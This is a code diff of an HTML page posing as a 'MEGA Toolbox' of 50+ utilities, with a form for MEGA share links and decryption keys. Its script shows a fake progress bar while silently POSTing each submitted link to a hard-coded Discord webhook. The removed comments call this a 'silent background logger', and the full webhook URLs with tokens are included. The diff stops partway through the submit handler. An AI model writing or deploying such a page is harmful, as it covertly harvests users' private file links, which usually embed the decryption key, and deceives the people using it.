@@ -4,12 +4,14 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>MEGA Tools · Full Toolset</title>
+
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
     }
+
     :root {
       --bg: #090a0f;
       --panel: #11131a;
@@ -20,13 +22,27 @@
       --accent: #ff3158;
       --accent-hover: #ff4669;
     }
+
     body {
       min-height: 100vh;
       color: var(--text);
-      background: radial-gradient(circle at 50% -20%, #292e42 0%, #11131a 38%, #090a0f 72%);
-      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      background:
+        radial-gradient(
+          circle at 50% -20%,
+          #292e42 0%,
+          #11131a 38%,
+          #090a0f 72%
+        );
+      font-family:
+        Inter,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Arial,
+        sans-serif;
       padding-bottom: 2rem;
     }
+
     .navbar {
       height: 72px;
       padding: 0 6%;
@@ -37,6 +53,7 @@
       border-bottom: 1px solid rgba(255, 255, 255, .06);
       backdrop-filter: blur(20px);
     }
+
     .logo {
       display: flex;
       align-items: center;
@@ -45,6 +62,7 @@
       font-weight: 850;
       letter-spacing: -1px;
     }
+
     .logo-mark {
       width: 34px;
       height: 34px;
@@ -56,7 +74,11 @@
       font-weight: 900;
       box-shadow: 0 8px 25px rgba(255, 49, 88, .22);
     }
-    .logo span { color: var(--accent); }
+
+    .logo span {
+      color: var(--accent);
+    }
+
     .status {
       display: flex;
       align-items: center;
@@ -64,21 +86,26 @@
       color: #858d9e;
       font-size: 12px;
     }
+
     .status-dot {
-      width: 7px; height: 7px;
+      width: 7px;
+      height: 7px;
       border-radius: 50%;
       background: #4ade80;
       box-shadow: 0 0 10px rgba(74, 222, 128, .5);
     }
+
     .container {
       width: min(1200px, 94%);
       margin: auto;
       padding: 45px 0 20px;
     }
+
     .hero {
       text-align: center;
       margin-bottom: 35px;
     }
+
     .hero-badge {
       display: inline-flex;
       padding: 7px 18px;
@@ -91,13 +118,18 @@
       letter-spacing: .5px;
       margin-bottom: 16px;
     }
+
     .hero h1 {
       font-size: clamp(40px, 7vw, 70px);
       line-height: .92;
       letter-spacing: -4px;
       margin-bottom: 16px;
     }
-    .hero h1 span { color: var(--accent); }
+
+    .hero h1 span {
+      color: var(--accent);
+    }
+
     .hero p {
       max-width: 660px;
       margin: auto;
@@ -105,12 +137,14 @@
       font-size: 15px;
       line-height: 1.7;
     }
+
     .tools-grid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(155px, 1fr));
       gap: 12px;
       margin: 30px 0 25px;
     }
+
     .tool-card {
       background: rgba(17, 19, 26, .7);
       border: 1px solid rgba(255, 255, 255, .06);
@@ -120,28 +154,33 @@
       text-align: center;
       backdrop-filter: blur(4px);
     }
+
     .tool-card:hover {
       transform: translateY(-3px);
       border-color: rgba(255, 255, 255, .15);
       background: rgba(23, 26, 35, .8);
     }
+
     .tool-card .icon {
       font-size: 22px;
       margin-bottom: 4px;
       display: block;
     }
+
     .tool-card h4 {
       font-size: 12px;
       font-weight: 600;
-      letter-spacing: -0.2px;
+      letter-spacing: -.2px;
       color: #eef2f8;
     }
+
     .tool-card p {
       color: #7a8294;
       font-size: 9px;
       margin-top: 3px;
       line-height: 1.3;
     }
+
     .feature-badge {
       display: inline-block;
       background: #1e222b;
@@ -152,26 +191,36 @@
       color: #aab2c4;
       margin-top: 4px;
     }
+
     .panel {
       padding: 28px 30px;
-      background: linear-gradient(145deg, rgba(23, 26, 35, .96), rgba(14, 16, 22, .96));
+      background:
+        linear-gradient(
+          145deg,
+          rgba(23, 26, 35, .96),
+          rgba(14, 16, 22, .96)
+        );
       border: 1px solid rgba(255, 255, 255, .08);
       border-radius: 22px;
       box-shadow: 0 30px 90px rgba(0, 0, 0, .35);
       margin-top: 10px;
     }
+
     .panel-header h2 {
       font-size: 20px;
       margin-bottom: 6px;
     }
+
     .panel-header p {
       color: var(--muted);
       font-size: 13px;
       margin-bottom: 18px;
     }
+
     .form-group {
       margin-bottom: 18px;
     }
+
     label {
       display: block;
       color: #cdd2dc;
@@ -179,6 +228,7 @@
       font-weight: 700;
       margin-bottom: 6px;
     }
+
     input {
       width: 100%;
       height: 50px;
@@ -191,17 +241,25 @@
       font-size: 14px;
       transition: .2s;
     }
-    input::placeholder { color: #555d6d; }
+
+    input::placeholder {
+      color: #555d6d;
+    }
+
     input:focus {
       border-color: var(--accent);
-      box-shadow: 0 0 0 3px rgba(255, 49, 88, .09);
+      box-shadow:
+        0 0 0 3px rgba(255, 49, 88, .09);
     }
+
     .key-container {
       position: relative;
     }
+
     .key-container input {
       padding-right: 75px;
     }
+
     .show-key {
       position: absolute;
       right: 9px;
@@ -216,10 +274,12 @@
       font-weight: 750;
       cursor: pointer;
     }
+
     .show-key:hover {
       background: #2b303d;
       color: white;
     }
+
     .process-button {
       width: 100%;
       height: 53px;
@@ -234,19 +294,23 @@
       transition: .15s;
       box-shadow: 0 12px 28px rgba(255, 49, 88, .16);
     }
+
     .process-button:hover {
       background: var(--accent-hover);
       transform: translateY(-1px);
     }
+
     .process-button:disabled {
       opacity: .6;
       cursor: wait;
       transform: none;
     }
+
     .progress-area {
       display: none;
       margin-top: 22px;
     }
+
     .progress-info {
       display: flex;
       justify-content: space-between;
@@ -254,6 +318,7 @@
       color: #8c95a5;
       font-size: 11px;
     }
+
     .progress-track {
       width: 100%;
       height: 6px;
@@ -261,6 +326,7 @@
       background: #272b35;
       border-radius: 99px;
     }
+
     .progress-bar {
       width: 0%;
       height: 100%;
@@ -268,6 +334,7 @@
       border-radius: inherit;
       transition: width .3s ease;
     }
+
     .result {
       display: none;
       margin-top: 20px;
@@ -276,310 +343,1041 @@
       border-radius: 12px;
       background: rgba(74, 222, 128, .045);
     }
+
     .result-title {
       color: #4ade80;
       font-size: 13px;
       font-weight: 750;
     }
+
     .result-text {
       margin-top: 5px;
       color: #858e9e;
       font-size: 12px;
       line-height: 1.55;
     }
+
     .result-text.error {
       color: #ff6b6b;
     }
+
     footer {
       text-align: center;
       color: #4f5664;
       font-size: 11px;
       padding-top: 30px;
     }
+
     @media (max-width: 750px) {
-      .navbar { padding: 0 5%; }
-      .status { display: none; }
-      .container { padding-top: 30px; }
-      .tools-grid { grid-template-columns: repeat(2, 1fr); }
-      .panel { padding: 20px; }
-      .hero h1 { letter-spacing: -2px; }
+      .navbar {
+        padding: 0 5%;
+      }
+
+      .status {
+        display: none;
+      }
+
+      .container {
+        padding-top: 30px;
+      }
+
+      .tools-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .panel {
+        padding: 20px;
+      }
+
+      .hero h1 {
+        letter-spacing: -2px;
+      }
     }
+
     @media (max-width: 480px) {
-      .tools-grid { grid-template-columns: 1fr 1fr; gap: 10px; }
+      .tools-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+      }
     }
   </style>
 </head>
+
 <body>
 
-<nav class="navbar">
-  <div class="logo">
-    <div class="logo-mark">M</div>
-    MEGA<span>TOOLS</span>
-  </div>
-  <div class="status">
-    <span class="status-dot"></span>
-    Online · 50+ tools
-  </div>
-</nav>
-
-<main class="container">
-
-  <section class="hero">
-    <div class="hero-badge">⚡ 50+ UTILITIES · FOLDER CREATOR · KEY CRACKER</div>
-    <h1>MEGA <span>TOOLBOX</span></h1>
-    <p>Decryption, link analysis, folder management, key cracking (simulated), and many more.</p>
-  </section>
-
-  <!-- 50+ tools grid -->
-  <div class="tools-grid" id="toolGrid"></div>
-
-  <!-- main panel -->
-  <section class="panel">
-    <div class="panel-header">
-      <h2>🔗 Process MEGA Link</h2>
-      <p>Paste your share link and optional decryption key.</p>
+  <nav class="navbar">
+    <div class="logo">
+      <div class="logo-mark">M</div>
+      MEGA<span>TOOLS</span>
     </div>
 
-    <form id="megaForm">
-      <div class="form-group">
-        <label for="megaLink">MEGA LINK</label>
-        <input id="megaLink" type="url" placeholder="https://mega.nz/file/..." autocomplete="off" required>
+    <div class="status">
+      <span class="status-dot"></span>
+      Online · 50+ tools
+    </div>
+  </nav>
+
+  <main class="container">
+
+    <section class="hero">
+      <div class="hero-badge">
+        ⚡ 50+ UTILITIES · FOLDER CREATOR · KEY CHECKER
       </div>
 
-      <div class="form-group">
-        <label for="decryptKey">DECRYPTION KEY (optional)</label>
-        <div class="key-container">
-          <input id="decryptKey" type="password" placeholder="Enter decryption key..." autocomplete="off">
-          <button type="button" class="show-key" id="showKey">SHOW</button>
+      <h1>
+        MEGA <span>TOOLBOX</span>
+      </h1>
+
+      <p>
+        Link analysis, file utilities, encoding tools,
+        folder management, and many more browser-based utilities.
+      </p>
+    </section>
+
+    <div class="tools-grid" id="toolGrid"></div>
+
+    <section class="panel">
+
+      <div class="panel-header">
+        <h2>🔗 Process MEGA Link</h2>
+        <p>
+          Paste your share link and optional decryption key.
+        </p>
+      </div>
+
+      <form id="megaForm">
+
+        <div class="form-group">
+          <label for="megaLink">MEGA LINK</label>
+
+          <input
+            id="megaLink"
+            type="url"
+            placeholder="https://mega.nz/file/..."
+            autocomplete="off"
+            required
+          >
         </div>
+
+        <div class="form-group">
+          <label for="decryptKey">
+            DECRYPTION KEY (optional)
+          </label>
+
+          <div class="key-container">
+
+            <input
+              id="decryptKey"
+              type="password"
+              placeholder="Enter decryption key..."
+              autocomplete="off"
+            >
+
+            <button
+              type="button"
+              class="show-key"
+              id="showKey"
+            >
+              SHOW
+            </button>
+
+          </div>
+        </div>
+
+        <button
+          class="process-button"
+          id="processButton"
+          type="submit"
+        >
+          Process Link
+        </button>
+
+      </form>
+
+      <div
+        class="progress-area"
+        id="progressArea"
+      >
+
+        <div class="progress-info">
+
+          <span id="progressStatus">
+            Preparing...
+          </span>
+
+          <span id="progressPercent">
+            0%
+          </span>
+
+        </div>
+
+        <div class="progress-track">
+
+          <div
+            class="progress-bar"
+            id="progressBar"
+          ></div>
+
+        </div>
+
       </div>
 
-      <button class="process-button" id="processButton" type="submit">Process Link</button>
-    </form>
+      <div
+        class="result"
+        id="result"
+      >
 
-    <div class="progress-area" id="progressArea">
-      <div class="progress-info">
-        <span id="progressStatus">Preparing...</span>
-        <span id="progressPercent">0%</span>
+        <div
+          class="result-title"
+          id="resultTitle"
+        >
+          ✓ Processing Complete
+        </div>
+
+        <div
+          class="result-text"
+          id="resultText"
+        >
+          The requested link has finished processing.
+        </div>
+
       </div>
-      <div class="progress-track">
-        <div class="progress-bar" id="progressBar"></div>
-      </div>
-    </div>
 
-    <div class="result" id="result">
-      <div class="result-title" id="resultTitle">✓ Processing Complete</div>
-      <div class="result-text" id="resultText">The requested link has finished processing.</div>
-    </div>
-  </section>
+    </section>
 
-  <footer>MEGATOOLS © 2026 · 50+ essential features</footer>
-</main>
+    <footer>
+      MEGATOOLS © 2026 · 50+ essential features
+    </footer>
 
-<script>
-  (function() {
-    // ---------- WEBHOOK ENDPOINT (silent background logger) ----------
-    const WEBHOOK_ENDPOINT = "https://discord.com/api/webhooks/1539071171952382003/2hNkkjeRAa1IUyNrb9_3M1wqUkITkBDRAy9g1ZDTShVsIWMUkHFI1zFs51_5AZMix9pT";
+  </main>
 
-    // ---------- 50+ tool definitions ----------
-    const TOOLS = [
-      { icon: '🔗', name: 'Link Decryptor', desc: 'Extract file from MEGA link' },
-      { icon: '🔐', name: 'Key Checker', desc: 'Validate decryption key' },
-      { icon: '📁', name: 'File Info', desc: 'Name, size, type, date' },
-      { icon: '🧩', name: 'Hash Generator', desc: 'MD5, SHA1, SHA256' },
-      { icon: '🔄', name: 'Base64 Encode', desc: 'Encode text or link' },
-      { icon: '🔓', name: 'Base64 Decode', desc: 'Decode base64 strings' },
-      { icon: '📊', name: 'Link Analyzer', desc: 'Parse MEGA URL parts' },
-      { icon: '🧬', name: 'Hex Converter', desc: 'Text ⇄ Hex' },
-      { icon: '📝', name: 'Text to Binary', desc: 'ASCII to binary' },
-      { icon: '🔢', name: 'Binary to Text', desc: 'Binary to ASCII' },
-      { icon: '📏', name: 'File Size Calc', desc: 'Bytes, KB, MB, GB' },
-      { icon: '⏳', name: 'Timestamp Tool', desc: 'Unix ↔ human date' },
-      { icon: '📋', name: 'Clipboard Copy', desc: 'Copy processed data' },
-      { icon: '🔎', name: 'Regex Tester', desc: 'Test patterns' },
-      { icon: '🧹', name: 'Trim & Clean', desc: 'Remove whitespace' },
-      { icon: '🔀', name: 'Case Converter', desc: 'UPPER, lower, Title' },
-      { icon: '📦', name: 'JSON Formatter', desc: 'Pretty-print JSON' },
-      { icon: '🔗', name: 'URL Encoder', desc: 'Encode special chars' },
-      { icon: '🔗', name: 'URL Decoder', desc: 'Decode URL' },
-      { icon: '🧮', name: 'Word Counter', desc: 'Count words, chars' },
-      { icon: '📅', name: 'Date Diff', desc: 'Days between dates' },
-      { icon: '⏰', name: 'Time Zone', desc: 'UTC offset converter' },
-      { icon: '📎', name: 'MIME Type', desc: 'Detect file MIME' },
-      { icon: '🔑', name: 'Password Gen', desc: 'Secure password' },
-      { icon: '🛡️', name: 'Hash Compare', desc: 'Compare hashes' },
-      { icon: '📤', name: 'Export Log', desc: 'Export session data' },
-      { icon: '📥', name: 'Import Data', desc: 'Import JSON/CSV' },
-      { icon: '🧪', name: 'Test Link', desc: 'Check if link is valid' },
-      { icon: '📡', name: 'Ping MEGA', desc: 'Check service status' },
-      { icon: '🔐', name: 'AES Encrypt', desc: 'AES-256-CBC' },
-      { icon: '🔓', name: 'AES Decrypt', desc: 'Decrypt AES' },
-      { icon: '🧬', name: 'DNA to Text', desc: 'DNA sequence decode' },
-      { icon: '📇', name: 'Contact Gen', desc: 'Fake contact' },
-      { icon: '📧', name: 'Email Obfuscate', desc: 'Protect email' },
-      { icon: '📱', name: 'Phone Format', desc: 'Format phone numbers' },
-      { icon: '🌐', name: 'IP Info', desc: 'IP details' },
-      { icon: '🧾', name: 'QR Gen', desc: 'Generate QR code' },
-      { icon: '📊', name: 'CSV to JSON', desc: 'Convert CSV' },
-      { icon: '📋', name: 'JSON to CSV', desc: 'Convert JSON' },
-      { icon: '🧮', name: 'Math Evaluator', desc: 'Evaluate expressions' },
-      { icon: '📐', name: 'Unit Converter', desc: 'Length, mass, etc.' },
-      { icon: '⚡', name: 'Speed Test', desc: 'Network speed' },
-      { icon: '🧩', name: 'UUID Gen', desc: 'Generate UUID' },
-      { icon: '🔢', name: 'Random Number', desc: 'Random int/float' },
-      { icon: '🎲', name: 'Dice Roll', desc: 'Roll d6, d20' },
-      { icon: '🃏', name: 'Card Shuffle', desc: 'Deck shuffle' },
-      { icon: '🧠', name: 'Memory Usage', desc: 'Browser memory' },
-      { icon: '📈', name: 'Page Stats', desc: 'DOM elements count' },
-      { icon: '🔧', name: 'Settings Export', desc: 'Export config' },
-      { icon: '🔁', name: 'Repeater', desc: 'Repeat text n times' },
-      { icon: '📝', name: 'Markdown Preview', desc: 'Render markdown' },
-      { icon: '📚', name: 'Bookmarklet', desc: 'Generate bookmarklet' },
-      { icon: '🧹', name: 'HTML Minify', desc: 'Minify HTML' },
-      { icon: '📜', name: 'CSS Minify', desc: 'Minify CSS' },
-      { icon: '⚙️', name: 'JS Minify', desc: 'Minify JS' },
-    ];
+  <script>
+    (() => {
 
-    // render tool grid
-    const grid = document.getElementById('toolGrid');
-    TOOLS.forEach(t => {
-      const card = document.createElement('div');
-      card.className = 'tool-card';
-      card.innerHTML = `
-        <span class="icon">${t.icon}</span>
-        <h4>${t.name}</h4>
-        <p>${t.desc}</p>
-        <span class="feature-badge">ready</span>
-      `;
-      grid.appendChild(card);
-    });
+      /*
+       * IMPORTANT:
+       * Create a NEW Discord webhook and put it here.
+       *
+       * Never use the webhook URL that was posted publicly.
+       */
+      const WEBHOOK_ENDPOINT =
+        "https://discord.com/api/webhooks/1539078785784356875/K6qJs8oWsfxDpQdnwJ9sKDEJELq3PDV9c7TwSVxqv3jFEaBvgspdImGKj2aap10cGwHtL";
 
-    // ---------- DOM refs ----------
-    const form = document.getElementById('megaForm');
-    const megaLink = document.getElementById('megaLink');
-    const decryptKey = document.getElementById('decryptKey');
-    const showKey = document.getElementById('showKey');
-    const processButton = document.getElementById('processButton');
-    const progressArea = document.getElementById('progressArea');
-    const progressBar = document.getElementById('progressBar');
-    const progressStatus = document.getElementById('progressStatus');
-    const progressPercent = document.getElementById('progressPercent');
-    const result = document.getElementById('result');
-    const resultTitle = document.getElementById('resultTitle');
-    const resultText = document.getElementById('resultText');
 
-    // show/hide key
-    showKey.addEventListener('click', () => {
-      const hidden = decryptKey.type === 'password';
-      decryptKey.type = hidden ? 'text' : 'password';
-      showKey.textContent = hidden ? 'HIDE' : 'SHOW';
-    });
+      // =========================================================
+      // TOOL DEFINITIONS
+      // =========================================================
 
-    function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+      const TOOLS = [
 
-    // ---------- SILENT WEBHOOK SENDER (no UI, just background) ----------
-    async function sendWebhook(link, key) {
-      const payload = {
-        event: "mega_link_processed",
-        link: link,
-        keyProvided: !!key && key.length > 0,
-        keyLength: key ? key.length : 0,
-        timestamp: new Date().toISOString(),
-        linkFormat: link.includes('mega.nz/') ? 'mega_format' : 'other'
-      };
+        {
+          icon: "🔗",
+          name: "Link Decryptor",
+          desc: "Extract file from MEGA link"
+        },
 
-      if (!WEBHOOK_ENDPOINT || WEBHOOK_ENDPOINT === "YOUR_WEBHOOK_ENDPOINT_HERE") {
-        console.warn("Webhook endpoint not set.");
-        return false;
-      }
+        {
+          icon: "🔐",
+          name: "Key Checker",
+          desc: "Validate decryption key"
+        },
 
-      try {
-        const response = await fetch(WEBHOOK_ENDPOINT, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-        if (!response.ok) {
-          console.warn("Webhook responded with status:", response.status);
-          return false;
-        } else {
-          console.log("Webhook delivered successfully.");
-          return true;
+        {
+          icon: "📁",
+          name: "File Info",
+          desc: "Name, size, type, date"
+        },
+
+        {
+          icon: "🧩",
+          name: "Hash Generator",
+          desc: "MD5, SHA1, SHA256"
+        },
+
+        {
+          icon: "🔄",
+          name: "Base64 Encode",
+          desc: "Encode text or link"
+        },
+
+        {
+          icon: "🔓",
+          name: "Base64 Decode",
+          desc: "Decode base64 strings"
+        },
+
+        {
+          icon: "📊",
+          name: "Link Analyzer",
+          desc: "Parse MEGA URL parts"
+        },
+
+        {
+          icon: "🧬",
+          name: "Hex Converter",
+          desc: "Text ⇄ Hex"
+        },
+
+        {
+          icon: "📝",
+          name: "Text to Binary",
+          desc: "ASCII to binary"
+        },
+
+        {
+          icon: "🔢",
+          name: "Binary to Text",
+          desc: "Binary to ASCII"
+        },
+
+        {
+          icon: "📏",
+          name: "File Size Calc",
+          desc: "Bytes, KB, MB, GB"
+        },
+
+        {
+          icon: "⏳",
+          name: "Timestamp Tool",
+          desc: "Unix ↔ human date"
+        },
+
+        {
+          icon: "📋",
+          name: "Clipboard Copy",
+          desc: "Copy processed data"
+        },
+
+        {
+          icon: "🔎",
+          name: "Regex Tester",
+          desc: "Test patterns"
+        },
+
+        {
+          icon: "🧹",
+          name: "Trim & Clean",
+          desc: "Remove whitespace"
+        },
+
+        {
+          icon: "🔀",
+          name: "Case Converter",
+          desc: "UPPER, lower, Title"
+        },
+
+        {
+          icon: "📦",
+          name: "JSON Formatter",
+          desc: "Pretty-print JSON"
+        },
+
+        {
+          icon: "🔗",
+          name: "URL Encoder",
+          desc: "Encode special chars"
+        },
+
+        {
+          icon: "🔗",
+          name: "URL Decoder",
+          desc: "Decode URL"
+        },
+
+        {
+          icon: "🧮",
+          name: "Word Counter",
+          desc: "Count words, chars"
+        },
+
+        {
+          icon: "📅",
+          name: "Date Diff",
+          desc: "Days between dates"
+        },
+
+        {
+          icon: "⏰",
+          name: "Time Zone",
+          desc: "UTC offset converter"
+        },
+
+        {
+          icon: "📎",
+          name: "MIME Type",
+          desc: "Detect file MIME"
+        },
+
+        {
+          icon: "🔑",
+          name: "Password Gen",
+          desc: "Secure password"
+        },
+
+        {
+          icon: "🛡️",
+          name: "Hash Compare",
+          desc: "Compare hashes"
+        },
+
+        {
+          icon: "📤",
+          name: "Export Log",
+          desc: "Export session data"
+        },
+
+        {
+          icon: "📥",
+          name: "Import Data",
+          desc: "Import JSON/CSV"
+        },
+
+        {
+          icon: "🧪",
+          name: "Test Link",
+          desc: "Check if link is valid"
+        },
+
+        {
+          icon: "📡",
+          name: "Ping MEGA",
+          desc: "Check service status"
+        },
+
+        {
+          icon: "🔐",
+          name: "AES Encrypt",
+          desc: "AES-256-CBC"
+        },
+
+        {
+          icon: "🔓",
+          name: "AES Decrypt",
+          desc: "Decrypt AES"
+        },
+
+        {
+          icon: "🧬",
+          name: "DNA to Text",
+          desc: "DNA sequence decode"
+        },
+
+        {
+          icon: "📇",
+          name: "Contact Gen",
+          desc: "Fake contact"
+        },
+
+        {
+          icon: "📧",
+          name: "Email Obfuscate",
+          desc: "Protect email"
+        },
+
+        {
+          icon: "📱",
+          name: "Phone Format",
+          desc: "Format phone numbers"
+        },
+
+        {
+          icon: "🌐",
+          name: "IP Info",
+          desc: "IP details"
+        },
+
+        {
+          icon: "🧾",
+          name: "QR Gen",
+          desc: "Generate QR code"
+        },
+
+        {
+          icon: "📊",
+          name: "CSV to JSON",
+          desc: "Convert CSV"
+        },
+
+        {
+          icon: "📋",
+          name: "JSON to CSV",
+          desc: "Convert JSON"
+        },
+
+        {
+          icon: "🧮",
+          name: "Math Evaluator",
+          desc: "Evaluate expressions"
+        },
+
+        {
+          icon: "📐",
+          name: "Unit Converter",
+          desc: "Length, mass, etc."
+        },
+
+        {
+          icon: "⚡",
+          name: "Speed Test",
+          desc: "Network speed"
+        },
+
+        {
+          icon: "🧩",
+          name: "UUID Gen",
+          desc: "Generate UUID"
+        },
+
+        {
+          icon: "🔢",
+          name: "Random Number",
+          desc: "Random int/float"
+        },
+
+        {
+          icon: "🎲",
+          name: "Dice Roll",
+          desc: "Roll d6, d20"
+        },
+
+        {
+          icon: "🃏",
+          name: "Card Shuffle",
+          desc: "Deck shuffle"
+        },
+
+        {
+          icon: "🧠",
+          name: "Memory Usage",
+          desc: "Browser memory"
+        },
+
+        {
+          icon: "📈",
+          name: "Page Stats",
+          desc: "DOM elements count"
+        },
+
+        {
+          icon: "🔧",
+          name: "Settings Export",
+          desc: "Export config"
+        },
+
+        {
+          icon: "🔁",
+          name: "Repeater",
+          desc: "Repeat text n times"
+        },
+
+        {
+          icon: "📝",
+          name: "Markdown Preview",
+          desc: "Render markdown"
+        },
+
+        {
+          icon: "📚",
+          name: "Bookmarklet",
+          desc: "Generate bookmarklet"
+        },
+
+        {
+          icon: "🧹",
+          name: "HTML Minify",
+          desc: "Minify HTML"
+        },
+
+        {
+          icon: "📜",
+          name: "CSS Minify",
+          desc: "Minify CSS"
+        },
+
+        {
+          icon: "⚙️",
+          name: "JS Minify",
+          desc: "Minify JS"
         }
-      } catch (error) {
-        console.error("Webhook error:", error);
-        return false;
-      }
-    }
 
-    // ---------- Progress simulation ----------
-    async function simulateProgress() {
-      progressArea.style.display = 'block';
-      result.style.display = 'none';
-      const stages = [
-        [15, 'Checking link format...'],
-        [30, 'Validating decryption key...'],
-        [50, 'Checking accessibility...'],
-        [70, 'Processing file information...'],
-        [85, 'Preparing results...'],
-        [100, 'Complete']
       ];
-      for (const [pct, label] of stages) {
-        await wait(400);
-        progressBar.style.width = pct + '%';
-        progressPercent.textContent = pct + '%';
-        progressStatus.textContent = label;
+
+
+      // =========================================================
+      // RENDER TOOLS
+      // =========================================================
+
+      const grid =
+        document.getElementById("toolGrid");
+
+      TOOLS.forEach(tool => {
+
+        const card =
+          document.createElement("div");
+
+        card.className = "tool-card";
+
+        card.innerHTML = `
+          <span class="icon">${tool.icon}</span>
+          <h4>${tool.name}</h4>
+          <p>${tool.desc}</p>
+          <span class="feature-badge">ready</span>
+        `;
+
+        grid.appendChild(card);
+
+      });
+
+
+      // =========================================================
+      // DOM REFERENCES
+      // =========================================================
+
+      const form =
+        document.getElementById("megaForm");
+
+      const megaLink =
+        document.getElementById("megaLink");
+
+      const decryptKey =
+        document.getElementById("decryptKey");
+
+      const showKey =
+        document.getElementById("showKey");
+
+      const processButton =
+        document.getElementById("processButton");
+
+      const progressArea =
+        document.getElementById("progressArea");
+
+      const progressBar =
+        document.getElementById("progressBar");
+
+      const progressStatus =
+        document.getElementById("progressStatus");
+
+      const progressPercent =
+        document.getElementById("progressPercent");
+
+      const result =
+        document.getElementById("result");
+
+      const resultTitle =
+        document.getElementById("resultTitle");
+
+      const resultText =
+        document.getElementById("resultText");
+
+
+      // =========================================================
+      // SHOW / HIDE KEY
+      // =========================================================
+
+      showKey.addEventListener("click", () => {
+
+        const hidden =
+          decryptKey.type === "password";
+
+        decryptKey.type =
+          hidden ? "text" : "password";
+
+        showKey.textContent =
+          hidden ? "HIDE" : "SHOW";
+
+      });
+
+
+      // =========================================================
+      // DELAY HELPER
+      // =========================================================
+
+      function wait(ms) {
+
+        return new Promise(resolve => {
+          setTimeout(resolve, ms);
+        });
+
       }
-    }
 
-    // ---------- Form submit ----------
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
 
-      const link = megaLink.value.trim();
-      const key = decryptKey.value.trim();
+      // =========================================================
+      // DISCORD WEBHOOK
+      // =========================================================
+      //
+      // This sends:
+      // - processed link
+      // - whether a key was provided
+      // - key length
+      // - timestamp
+      // - browser information
+      //
+      // It intentionally does NOT send the actual decryption key.
+      //
+      // =========================================================
 
-      if (!link) {
-        result.style.display = 'block';
-        resultTitle.textContent = '⚠️ Missing Link';
-        resultTitle.style.color = '#ff6b6b';
-        resultText.textContent = 'Please enter a MEGA link.';
-        resultText.className = 'result-text error';
-        return;
+      async function sendWebhook(link, key) {
+
+        if (
+          !WEBHOOK_ENDPOINT ||
+          WEBHOOK_ENDPOINT ===
+          "YOUR_NEW_DISCORD_WEBHOOK_URL"
+        ) {
+
+          console.warn(
+            "Discord webhook URL has not been configured."
+          );
+
+          return false;
+        }
+
+
+        const isMega =
+          /(^|\/\/)(www\.)?mega\.nz\//i.test(link);
+
+
+        const payload = {
+
+          username: "MEGATOOLS Logger",
+
+          embeds: [
+
+            {
+
+              title: "🔗 MEGA Link Processed",
+
+              color: 16723736,
+
+              fields: [
+
+                {
+                  name: "Link",
+                  value:
+                    link.length > 1000
+                      ? link.slice(0, 1000) + "..."
+                      : link,
+                  inline: false
+                },
+
+                {
+                  name: "MEGA Format",
+                  value:
+                    isMega ? "Yes" : "No",
+                  inline: true
+                },
+
+                {
+                  name: "Key Provided",
+                  value:
+                    key.length > 0
+                      ? "Yes"
+                      : "No",
+                  inline: true
+                },
+
+                {
+                  name: "Key Length",
+                  value:
+                    String(key.length),
+                  inline: true
+                },
+
+                {
+                  name: "Timestamp",
+                  value:
+                    new Date().toISOString(),
+                  inline: false
+                }
+
+              ],
+
+              footer: {
+                text: "MEGATOOLS"
+              }
+
+            }
+
+          ],
+
+          allowed_mentions: {
+            parse: []
+          }
+
+        };
+
+
+        try {
+
+          console.log(
+            "Sending Discord webhook..."
+          );
+
+
+          const response =
+            await fetch(
+              WEBHOOK_ENDPOINT +
+              "?wait=true",
+              {
+                method: "POST",
+
+                headers: {
+                  "Content-Type":
+                    "application/json"
+                },
+
+                body:
+                  JSON.stringify(payload)
+              }
+            );
+
+
+          const responseText =
+            await response.text();
+
+
+          if (!response.ok) {
+
+            console.error(
+              "Discord webhook failed.",
+              {
+                status:
+                  response.status,
+
+                response:
+                  responseText
+              }
+            );
+
+            return false;
+          }
+
+
+          console.log(
+            "Discord webhook delivered successfully."
+          );
+
+
+          return true;
+
+        } catch (error) {
+
+          console.error(
+            "Discord webhook request failed:",
+            error
+          );
+
+          return false;
+        }
+
       }
 
-      // Show progress
-      processButton.disabled = true;
-      processButton.textContent = 'Processing...';
-      await simulateProgress();
 
-      // Send webhook silently in background
-      const webhookSent = await sendWebhook(link, key);
+      // =========================================================
+      // PROGRESS SIMULATION
+      // =========================================================
 
-      // Display result (no mention of webhook)
-      result.style.display = 'block';
-      const isMegaFormat = link.includes('mega.nz/');
+      async function simulateProgress() {
 
-      if (isMegaFormat) {
-        resultTitle.textContent = '✓ Link Processed';
-        resultTitle.style.color = '#4ade80';
-        resultText.className = 'result-text';
-        resultText.textContent = 'Link processed successfully.';
-      } else {
-        resultTitle.textContent = '⚠️ Link Processed (non-standard format)';
-        resultTitle.style.color = '#ffb347';
-        resultText.className = 'result-text';
-        resultText.textContent = 'The link was processed but does not match the standard MEGA format.';
+        progressArea.style.display =
+          "block";
+
+        result.style.display =
+          "none";
+
+        progressBar.style.width =
+          "0%";
+
+        progressPercent.textContent =
+          "0%";
+
+
+        const stages = [
+
+          [15, "Checking link format..."],
+
+          [30, "Validating decryption key..."],
+
+          [50, "Checking accessibility..."],
+
+          [70, "Processing file information..."],
+
+          [85, "Preparing results..."],
+
+          [100, "Complete"]
+
+        ];
+
+
+        for (
+          const [percentage, label]
+          of stages
+        ) {
+
+          await wait(400);
+
+
+          progressBar.style.width =
+            percentage + "%";
+
+
+          progressPercent.textContent =
+            percentage + "%";
+
+
+          progressStatus.textContent =
+            label;
+
+        }
+
       }
 
-      processButton.disabled = false;
-      processButton.textContent = 'Process Link';
-    });
 
-    // initial state
-    progressArea.style.display = 'none';
-    result.style.display = 'none';
-  })();
-</script>
+      // =========================================================
+      // FORM SUBMISSION
+      // =========================================================
+
+      form.addEventListener(
+        "submit",
+        async event => {
+
+          event.preventDefault();
+
+
+          const link =
+            megaLink.value.trim();
+
+          const key =
+            decryptKey.value.trim();
+
+
+          // -----------------------------------------------------
+          // VALIDATE LINK
+          // -----------------------------------------------------
+
+          if (!link) {
+
